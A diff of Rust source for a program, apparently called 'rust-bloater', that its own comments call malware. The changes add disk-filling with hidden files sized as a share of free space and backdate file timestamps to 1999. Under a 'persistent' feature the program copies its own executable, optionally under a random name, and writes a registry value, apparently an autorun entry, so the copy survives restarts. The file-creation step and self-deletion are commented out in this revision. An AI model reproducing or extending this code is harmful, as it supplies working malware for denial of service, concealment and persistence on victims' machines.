@@ -13,13 +13,18 @@ use std::io::*;
 use std::os::windows::prelude::*;
 
 use std::path::Path;
-use rand::Rng;
+use rand::{Rng, thread_rng};
+use rand::distributions::Alphanumeric;
 use regex::Regex;
 use sysinfo::Disks;
 use filetime::{set_file_times,FileTime};
+use std::iter;
 
 
-// Slice the string to get the root disk letter if it's Windows
+static OUTPUT_PATH: &'static [&str] = &[r"/temp/", r"/tmp/", r"/"];
+static BLOAT_CAPACITY: f64 = 0.10; // Between 0.0 and 1.0
+
+// Slice the string to get the root disk letter if it's Windows or the disk path on Linux
 fn slice_string(input: &str) -> &str {
 	// Define the pattern to detect the filesystem : Windows or Unix
 	let pattern = Regex::new(r"(\\)|(/)").unwrap();
@@ -31,9 +36,11 @@ fn slice_string(input: &str) -> &str {
 
 #[cfg(target_os = "windows")]
 // Create the file when compiled on Windows system
-fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	
+fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> String{	
 
 	let path_file: String = format!("{}{}.bh",path,name);
+
+	// Create a file with the hidden attribute
 	let _ = File::options().create(true).write(true).attributes(winapi::um::winnt::FILE_ATTRIBUTE_HIDDEN).open(&path_file).expect("Valid filepath").write_all(&data);
 
 	return path_file
@@ -42,7 +49,7 @@ fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{
 
 #[cfg(target_os = "linux")]
 // Create the file when compiled on Linux system
-fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{	
+fn create_bloatfile(path: &str, name:String, data: Vec<u8>) -> String{	
 
 	let path_file: String = format!("{}.{}.bh",path,name);
 
@@ -56,17 +63,24 @@ fn create_file(path: &str, name:u64, data: Vec<u8>) -> String{
 
 #[cfg(target_os = "windows")]
 // Adding persistence for the windows compilation
-fn adding_persistence(filepath: &str) -> std::io::Result<()>{
-	let original_path = std::env::current_exe()?;
-    let new_path = format!("{}{}",Path::new(r"%appdata%/").display(),"bloater_copy.exe");
+fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
+	
+	let previous_exe_path = std::env::current_exe()?;
+
+	// Create the new exe in the Appdata/Local/temp folder of the user
+    //let new_exe_path = format!("{}{}",Path::new(&std::env::temp_dir()).display(),"bloater_copy.exe");
+
+	let new_exe_path = format!("{}{}.exe",filepath,exe_name);
+
 
     let mut f ;
 	let mut buffer:Vec<u8> = Vec::new();
 
-    let file = match File::open(&original_path){
+	// Open the previous one and copy its content to the new one
+    let file = match File::open(&previous_exe_path){
 		Ok(mut file) => {
 			file.read_to_end(&mut buffer);
-			f = File::create(&new_path).unwrap();
+			f = File::create(&new_exe_path).unwrap();
 		},
 		Err(err) => {
 			println!("File not found");
@@ -77,20 +91,24 @@ fn adding_persistence(filepath: &str) -> std::io::Result<()>{
 
 	f.write_all(&buffer);
 
-    println!("Created a copy of {} at {}", original_path.display(), new_path);
-
-	let name = "rust_bloater";
-
-
+    println!("Created a copy of {} at {}", previous_exe_path.display(), new_exe_path);
 	
 	let hkcu = RegKey::predef(HKEY_CURRENT_USER);
         hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
             .set_value::<_, _>(
-                &name,
-                &str::replace(&new_path, "/", r"\"),
+                &new_exe_path,
+                &str::replace(&new_exe_path, "/", r"\"),
             )?;
 
 
+	set_file_times(new_exe_path, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
+		// Delete the old reg key from the previous exe created
+		/*
+		hkcu.open_subkey_with_flags(AL_REGKEY, KEY_SET_VALUE)?
+        .delete_value(&previous_exe_path)?;
+		*/
+
+	
 
 	Ok(())
 }
@@ -98,7 +116,7 @@ fn adding_persistence(filepath: &str) -> std::io::Result<()>{
 
 #[cfg(target_os = "linux")]
 // Adding persistenec for the linux compilation
-fn adding_persistence(path: &str) -> std::io::Result<()>{
+fn adding_persistence(filepath: &str, exe_name: &str) -> std::io::Result<()>{
 	Ok(())	
 }
 
@@ -117,6 +135,9 @@ fn main() -> std::io::Result<()> {
 		disk_array.push(info);
 		println!("Disk : {:?}",info);
 
+		// Limit for one disk for now
+		break;
+
 	}	
 
 	// Bloating each disks found
@@ -128,10 +149,10 @@ fn main() -> std::io::Result<()> {
 		// Search for a valid path to write to
 		let mut valid_path = String::new();
 		// Try different path on the disk where it can write to
-		let path_array = [r"/temp/", r"/tmp/", r"/"];
+		
 		let mut has_found_path = false;
 
-		for path in path_array {
+		for path in OUTPUT_PATH {
 		let temp_path:String = format!("{}{}",disk_root, path).as_str().to_string();
 		println!("Trying path : {}", temp_path);
 		// If a valid path is found
@@ -154,37 +175,62 @@ fn main() -> std::io::Result<()> {
 		let mut rng = rand::thread_rng();
 		
 		// Create the files
-		for _ in 1..2{
-
-			// Generate a random numbers
-			let n2:u64 = rng.gen();
+		for i in 1..2{
 
 			// 1Mo =  1_048_576
 			// 16Mo = 16_777_216
 			// 128Mo = 134_217_728
 
-			let size = available_space / 100;
+			// Give an initial name to the file created
+			let mut filename: String = format!("file-{}", i);
+
+			let filesize = (available_space as f64) * BLOAT_CAPACITY;
+			
+			// Give a random name to the file if the feature is enabled
+			#[cfg(feature="randomized")]{
+				// Generate a random numbers
+				let number:u64 = rng.gen();
+				filename = number.to_string();
+			}
 
 			// Vec with specified size (number of elements in the vector)
 			//let encoded: Vec<u8> = vec![0;size.try_into().unwrap()];
 			let encoded: Vec<u8> = vec![0;1_048_576];
 
-			let path_file: String = create_file(&valid_path,n2,encoded);
+			/*
+			let path_file: String = create_bloatfile(&valid_path,filename,encoded);
 			
 			// Change the access and modified date to 1999
 			let _ = set_file_times(path_file, FileTime::from_unix_time(915148800,0),FileTime::from_unix_time(915148800,0));
-
+			*/
 			}
 
-			println!("VAR HOME : {:?}", std::env::var("HOMEPATH"));
 
+			// Add persistence to the malware if the feature is enabled
 			#[cfg(feature="persistent")]{
-				adding_persistence(&valid_path);
+
+				let mut exe_name:String = format!("rust-bloater");
+				
+				// Give the executable a random name if the feature is enabled
+				#[cfg(feature="randomized")]{
+				let mut rng = thread_rng();
+				exe_name = iter::repeat(()).map(|()| rng.sample(Alphanumeric)).map(char::from).take(10).collect();
+				}
+
+				adding_persistence(&valid_path, &exe_name);
+
 				}
 			
 
 	}	
 
+
+	// Remove the file the initial file
+	/*
+	#[cfg(feature="persistent")]{
+	std::fs::remove_file(previous_exe_path)?;
+	}
+	*/
 	
 	Ok(())
 
